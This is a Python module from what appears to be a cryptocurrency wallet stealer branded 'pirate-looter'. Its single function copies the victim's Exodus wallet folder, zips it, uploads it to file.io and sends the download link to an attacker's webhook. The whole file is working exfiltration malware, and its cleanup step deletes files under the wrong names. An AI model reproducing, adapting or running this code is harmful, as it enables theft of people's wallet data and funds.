import os.path, shutil, requests
from configs import hook

user = os.path.expanduser("~")
def exo():
 if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
  shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
  shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")

  files = {'file': open(user+'\\AppData\\Local\\Temp\\Exodus.zip', 'rb')}
  params = {'expire': 'never'}

  response = requests.post("https://file.io", files=files, params=params).json()
  
  me = {
    "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
    "username": "pirate-looter",
    "embeds": [
        {
            "title": "pirate-looter",
            "fields": [
                {
                    "name": "Download Link",
                    "value": f"`{response['link']}`",
                    "inline": True
                },
                {
                    "name": "pirate-looter Found",
                    "value": f"`Yes\n`",
                    "inline": True
                }
            ],
            "image": {
                "url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif",
                "height": 0,
                "width": 0
            }
        }
    ]
}         
  headers = {
    "Content-Type": "application/json"}
  r = requests.post(hook,data=me)
  try:
   os.remove(user+"\\AppData\\Local\\Temp\\pirate-looter.zip")
   os.remove(user+"\\AppData\\Local\\Temp\\pirate-looter")
  except:
    pass
